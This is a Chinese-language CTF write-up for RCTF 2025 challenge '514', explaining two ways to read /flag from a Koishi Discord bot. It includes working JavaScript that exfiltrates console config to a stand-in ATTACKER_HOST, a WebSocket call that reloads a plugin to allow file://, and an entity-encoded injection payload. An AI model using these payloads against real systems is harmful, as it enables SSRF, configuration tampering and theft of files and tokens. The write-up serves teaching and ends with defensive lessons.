# 514

## 题目简述

目标是一个运行在容器中的 Koishi Discord bot，开放网页截图和 Project SEKAI 表情包绘制功能，flag 位于容器根目录 `/flag`。题目环境每 10 秒恢复一次插件配置，要求在有限窗口内利用 bot 的浏览器访问能力读取本地文件。

仓库单题 WP 给出 intended route：网页截图造成 SSRF，攻击者页面再利用 Koishi Console 未鉴权且不校验 `Origin` 的 WebSocket 热重载截图插件，临时放行 `file` 协议。总 PDF 记录了另一条独立路线：`pjsk-pptr@1.1.7` 把用户文本插入本地 `file://` 页面中的 JavaScript，可直接注入 iframe 并让截图回显 `/flag`。两条路线都成立，下面分别说明。

## 解题过程

### 1. 确认容器内的攻击面

Dockerfile 明确执行 `COPY flag /flag`，Koishi 监听 `5140`，且启用了：

```text
puppeteer
screenshot:1.0.5
pjsk-pptr:1.1.7
```

`shot <url>` 使用容器内 Chromium 访问 URL，默认只允许 `http`、`https`；这既能访问攻击者页面，也把浏览器放进了可连接 `127.0.0.1:5140` 的内网位置。题面提供的 Discord 邀请和远程 bot 都是比赛期间的临时入口，不影响机制复现，因此不保留为长期参考链接。

### 2. Intended route：泄露随机插件 ID

Koishi Console 通过 `ws://127.0.0.1:5140/status` 管理配置。题目关闭了 auth 插件，而该 WebSocket 服务又不校验浏览器的 `Origin`；浏览器同源策略不会替服务端完成 WebSocket 鉴权，于是攻击者托管的普通 HTTP 页面可以从 bot 的 Chromium 中连接本机管理端口。

先让 bot 执行一次 `shot`，访问包含以下逻辑的页面：

```javascript
const ws = new WebSocket('ws://127.0.0.1:5140/status');

ws.onmessage = async (event) => {
  const msg = JSON.parse(event.data);
  if (msg.type === 'data' && msg.body?.key === 'config') {
    await fetch('http://ATTACKER_HOST:7891/?data=' +
                encodeURIComponent(event.data));
  }
};
```

Console 推送的 `config` 数据包含所有插件实例名。实例后缀在安装时随机生成，不能照抄本地值；从 `body.value.plugins` 中记录远端的：

```text
screenshot:<remote-random-id>
```

官方 WP 示例中为 `screenshot:lsan28`，但实际应以当次泄露结果为准。泄露消息中还可能包含 bot token 等敏感配置，解题只取插件 ID，不应传播或使用无关凭据。

### 3. Intended route：热重载放行 file 协议

再让 bot 截图第二个攻击者页面。该页面连接同一个 WebSocket，并在 `onopen` 中发送：

```javascript
ws.send(JSON.stringify({
  id: 'reload',
  type: 'manager/reload',
  args: [
    '',
    'screenshot:<remote-random-id>',
    { protocols: ['http', 'https', 'file'] }
  ]
}));
```

`koishi-plugin-screenshot@1.0.5` 的配置项 `protocols` 默认是 `['http', 'https']`，命令只检查 URL scheme 是否在该数组中。未鉴权的 `manager/reload` 把 `file` 加入后，立刻发送：

```text
shot file:///flag
```

Chromium 便会加载本地文本并将其截图回 Discord。环境中的 `ws_status.js` 每 10 秒比较当前配置与启动基线，并通过同一个 `manager/reload` 恢复改动，因此“重载插件 → 截图 `/flag`”必须在一个恢复周期内完成；这就是题面 10 秒提示的真实含义。

### 4. PDF route：`pjsk-pptr` JavaScript 注入

总 PDF 根据交互信息定位到 [`koishi-plugin-pjsk-pptr`](https://github.com/araea/koishi-plugin-pjsk-pptr) 和 Koishi 的 [`puppeteer` 浏览器服务](https://github.com/koishijs/koishi-plugin-puppeteer)。题目固定使用易受攻击的 `pjsk-pptr@1.1.7`；当前上游已在说明中标注修复本地文件读取和内网 SSRF，复现时不能拿新版本行为否定比赛环境。

1.1.7 先执行：

```javascript
text = inputText.replace(/\/+/g, '\\n').replace(/\n/g, '\\n');
```

随后把结果直接拼进脚本字符串：

```javascript
const text = '${text}';
```

渲染流程则是：

```javascript
await page.goto('file://' + filePath);
await page.setContent(h.unescape(htmlContent), { waitUntil: 'load' });
const canvas = await page.$('canvas#myCanvas');
return canvas.screenshot(...);
```

这里同时形成三个条件：用户可以用单引号逃出字符串；`h.unescape()` 会在 `/` 替换之后才把 HTML 数字实体还原成标点；页面先导航到本地 HTML，所以注入脚本运行在可加载本地资源的 `file://` 上下文。

作为 `text` 提交的 payload 核心如下；末尾 `B` 的闭合单引号由模板中 `${text}` 后面的原有 `'` 补齐。它创建指向 `/flag` 的 iframe，并把 iframe 绝对定位到 canvas 的同一矩形、提高 `z-index`；Puppeteer 对 canvas 边界截图时，实际捕获的是已经叠在上面的 iframe 内容：

```javascript
A' + (async () => {
  const c = myCanvas;
  const w = c.parentElement;
  const f = document.createElement('iframe');

  w.style.cssText = `position:relative;width:${c.width}px;height:${c.height}px`;
  f.src = atob('ZmlsZTovLy9mbGFn');  // file:///flag
  f.style.cssText =
    'position:absolute;top:0;left:0;width:100%;height:100%;' +
    'border:none;z-index:10';
  w.insertBefore(f, c);
  c.style.cssText = 'position:absolute;top:0;left:0';
  await new Promise(resolve => f.onload = resolve);
})() + 'B
```

提交前将除英文字母外的字符全部转为 `&#<十进制码点>;`。这样插件最初看到的是不含直接 `/`、引号和括号的实体文本，不会被换行替换破坏；进入 `page.setContent()` 前，`h.unescape()` 又会将其恢复成可执行 JavaScript。

PDF 中的成功截图如下，`[object Promise]B` 是异步 IIFE 参与字符串拼接留下的副产物，并不影响 iframe 执行：

![pjsk-pptr 注入后在贴纸截图上方回显本地 flag](RCTF2025-514-wp/challenge-sticker-flag-hint.png)

两条路线最终读取到同一个 flag：

```text
RCTF{I_see_U~what_about_Looking_@t_Your_back~}
```

## 方法总结

- Bot 的“网页截图”应视为浏览器 SSRF：攻击者控制的不只是目标 URL，还控制浏览器执行的脚本，而浏览器所在网络、localhost 服务和文件权限都会进入攻击面。
- WebSocket 不会因为使用浏览器就自动安全。服务端必须验证会话、权限和 `Origin`，尤其不能让未认证客户端调用 `manager/reload` 这类配置写接口。
- 模板注入审计要按真实处理顺序推导：本题先替换斜杠、后做 HTML entity 解码，导致实体编码可以把危险字符推迟到过滤之后出现；再叠加 `file://` 页面和元素截图，最终从 JavaScript 注入升级为本地文件读取。
